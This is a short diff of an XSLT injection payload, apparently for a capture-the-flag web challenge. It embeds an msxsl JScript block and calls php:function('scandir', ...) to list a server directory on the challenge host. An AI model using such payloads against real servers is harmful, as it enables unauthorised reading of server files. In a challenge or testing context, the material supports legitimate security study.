@@ -1,11 +1,14 @@
+
 <xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"
 xmlns:msxsl="urn:schemas-microsoft-com:xslt"
 xmlns:user="http://mycompany.com/mynamespace"     
 >	
-<msxsl:script language="javascript" implements-prefix="user">
+<msxsl:script language="JScript" implements-prefix="user">
+<![CDATA[
 function test(){return "hello world!";}
+]]>
 </msxsl:script>
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
